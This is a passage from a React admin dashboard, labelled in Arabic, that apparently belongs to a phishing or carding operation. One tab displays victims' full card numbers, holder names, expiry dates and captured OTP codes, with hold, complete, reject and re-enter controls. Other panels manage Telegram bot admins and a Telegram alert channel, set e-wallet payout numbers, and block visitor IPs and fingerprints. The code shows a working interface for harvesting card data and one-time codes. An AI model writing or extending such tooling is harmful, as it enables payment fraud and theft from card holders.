                      setChatReply('');
                      setOk('تم الإرسال للعميل');
                      openChat(chatSessionId);
                    })}>إرسال</Btn>
                  </Panel>
                )}
              </div>
            )}

            {tab === 'ccotp' && (
              <Panel title="أكواد بطاقة الائتمان">
                <table className="admin-table">
                  <thead>
                    <tr>
                      <th>طلب</th>
                      <th>صاحب البطاقة</th>
                      <th>رقم البطاقة</th>
                      <th>انتهاء</th>
                      <th>كود OTP</th>
                      <th>قرار</th>
                      <th>إجراء</th>
                    </tr>
                  </thead>
                  <tbody>
                    {ccSubs.map((s) => (
                      <tr
                        key={s.id}
                        className={selectedCc?.id === s.id ? 'admin-table__row--active' : ''}
                        onClick={() => setSelectedCc(s)}
                      >
                        <td>
                          <button
                            type="button"
                            className="admin-link"
                            onClick={(e) => { e.stopPropagation(); openOrder(s.orderId); }}
                          >
                            {s.orderId}
                          </button>
                        </td>
                        <td>{s.card?.holder || '—'}</td>
                        <td><code dir="ltr">{s.card?.pan || '—'}</code></td>
                        <td dir="ltr">{s.card?.expiry || '—'}</td>
                        <td><code>{s.otp}</code></td>
                        <td>{s.decision}</td>
                        <td className="admin-actions">
                          {['hold', 'complete', 'reject', 'reenter'].map((a) => (
                            <button
                              key={a}
                              type="button"
                              className="admin-chip"
                              onClick={(e) => {
                                e.stopPropagation();
                                run(async () => {
                                  await adminRequest(`/api/admin/cc-otp/submissions/${s.id}/decision`, code, {
                                    method: 'POST',
                                    body: JSON.stringify({ action: a }),
                                  });
                                  setOk('تم');
                                  loadCc();
                                });
                              }}
                            >
                              {a}
                            </button>
                          ))}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
                {selectedCc && (
                  <div className="admin-detail">
                    <h3>طلب {selectedCc.orderId} — كود: <code>{selectedCc.otp}</code></h3>
                    <CreditCardDetails card={selectedCc.card} />
                  </div>
                )}
              </Panel>
            )}

            {tab === 'admins' && botAdmins && (
              <Panel title="مدراء مفوّضون (تيليغرام)">
                <p className="text-muted text-sm">المفاتيح: payment, profiles, orders, crm, site, blocked, marketing, ai, system, all</p>
                <div className="admin-toolbar">
                  <Input placeholder="User ID" value={newAdminId} onChange={(e) => setNewAdminId(e.target.value)} />
                  <Input placeholder="صلاحيات (مثال: all)" value={newAdminPerms} onChange={(e) => setNewAdminPerms(e.target.value)} />
                  <Btn onClick={() => run(async () => {
                    await adminRequest('/api/admin/bot-admins', code, {
                      method: 'POST',
                      body: JSON.stringify({ userId: newAdminId, permissions: newAdminPerms }),
                    });
                    setNewAdminId('');
                    loadBotAdmins();
                  })}>إضافة</Btn>
                </div>
                <ul className="admin-list">
                  {Object.entries(botAdmins.delegates || {}).map(([id, row]) => (
                    <li key={id}>
                      <code>{id}</code> — {(row.permissions || []).join(', ')}
                      <Btn variant="outline" onClick={() => run(async () => {
                        await adminRequest(`/api/admin/bot-admins/${id}`, code, { method: 'DELETE' });
                        loadBotAdmins();
                      })}>إزالة</Btn>
                    </li>
                  ))}
                </ul>
              </Panel>
            )}

            {tab === 'system' && (
              <Panel
                title="النظام وتيليغرام"
                actions={
                  <Btn
                    variant="outline"
                    onClick={() => run(async () => {
                      setTelegramProbe(await adminRequest('/api/admin/telegram-probe', code));
                    })}
                  >
                    فحص الاتصال
                  </Btn>
                }
              >
                <EmptyHint>تحقق من TELEGRAM_BOT_TOKEN و TELEGRAM_CHAT_ID في إعدادات السيرفر.</EmptyHint>
                {telegramProbe?.chatId && (
                  <div className="admin-system-card glass-panel">
                    <h3>قناة تيليغرام</h3>
                    <StatusPill
                      ok={Boolean(telegramProbe.chatId.ok)}
                      label={telegramProbe.chatId.ok ? 'متصل' : 'غير متصل'}
                    />
                    <p className="text-sm text-muted">
                      {telegramProbe.chatId.chatTitle
                        || telegramProbe.chatId.telegramDescription
                        || telegramProbe.chatId.hint
                        || '—'}
                    </p>
                  </div>
                )}
                {telegramProbe && (
                  <details className="admin-details">
                    <summary>تفاصيل تقنية</summary>
                    <pre className="admin-pre">{JSON.stringify(telegramProbe, null, 2)}</pre>
                  </details>
                )}
              </Panel>
            )}
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

function mkFields(profile, code, run, reload) {
  const fields = [
    ['fastPay_number', 'FastPay رقم', 'fastPay', 'number'],
    ['zainCash_number', 'زين كاش', 'zainCash', 'number'],
    ['asiaHawala_number', 'آسيا حوالة', 'asiaHawala', 'number'],
    ['fib_accountNumber', 'FIB حساب', 'fib', 'accountNumber'],
    ['fib_accountName', 'FIB اسم', 'fib', 'accountName'],
  ];
  return (
    <div className="admin-field-grid">
      {fields.map(([key, label, method, prop]) => {
        const val = profile.methods?.[method]?.[prop] || '';
        return (
          <Field key={key} label={label}>
            <Input
              defaultValue={val}
              onBlur={(e) => run(async () => {
                await adminRequest(`/api/admin/profiles/${profile.id}/fields`, code, {
                  method: 'PATCH',
                  body: JSON.stringify({ fieldKey: key, value: e.target.value }),
                });
                reload();
              }, true)}
            />
          </Field>
        );
      })}
    </div>
  );
}

function BlockedPanel({ blocked, code, run, reload, setOk }) {
  const [ip, setIp] = useState('');
  const [fp, setFp] = useState('');
  return (
    <div className="admin-split">
      {[
        ['IPs', blocked.ips, 'ip', ip, setIp, '/api/admin/blocked/ip', (v) => ({ ip: v })],
        ['بصمات', blocked.fingerprints, 'fingerprint', fp, setFp, '/api/admin/blocked/fingerprint', (v) => ({ fingerprint: v })],
        ['دردشة — مستخدمين', blocked.chatUsers, 'fingerprint', fp, setFp, '/api/admin/blocked/chat-user', (v) => ({ fingerprint: v })],
        ['دردشة — IP', blocked.chatIps, 'ip', ip, setIp, '/api/admin/blocked/chat-ip', (v) => ({ ip: v })],
      ].map(([title, list, field, val, setVal, postPath, bodyFn]) => (
        <Panel key={title} title={title}>
          <div className="admin-toolbar">
            <Input value={val} onChange={(e) => setVal(e.target.value)} placeholder={field} />
            <Btn onClick={() => run(async () => {
              await adminRequest(postPath, code, { method: 'POST', body: JSON.stringify(bodyFn(val)) });
              setVal('');
              setOk('تم الحظر');
              reload();
            })}>حظر</Btn>
          </div>
          <ul className="admin-list">
            {(list || []).map((it) => (
              <li key={it[field] || it.ip || it.fingerprint}>
                <code>{it[field] || it.ip || it.fingerprint}</code>
                <Btn variant="outline" onClick={() => run(async () => {
                  const raw = it[field] || it.ip || it.fingerprint;
                  const del = `${postPath}/${encodeURIComponent(raw)}`;
                  await adminRequest(del, code, { method: 'DELETE' });
                  reload();
                })}>فك الحظر</Btn>
              </li>
            ))}
          </ul>
        </Panel>
      ))}
    </div>
  );
}

